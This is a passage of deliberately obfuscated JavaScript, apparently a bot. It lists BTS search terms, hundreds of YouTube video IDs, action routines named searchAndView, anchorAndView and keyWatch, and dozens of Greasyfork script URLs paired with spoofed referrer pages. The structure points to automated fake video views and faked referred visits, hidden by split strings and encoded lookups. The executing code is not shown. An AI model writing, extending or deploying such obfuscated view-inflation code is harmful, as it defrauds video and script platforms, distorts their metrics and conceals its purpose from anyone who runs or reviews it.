'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x1ef + -0x1 * 0xaf6 + -0xec * -0xe);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    X(0xa) + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    X(0x4) + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    W(0xe) + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + X(0x1) + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + W(0x3),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + W(0x6) + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0x9, 'M1oS') + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + W(0x2) + '-insta-sta' + 'rter-resou' + W(0xf) + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
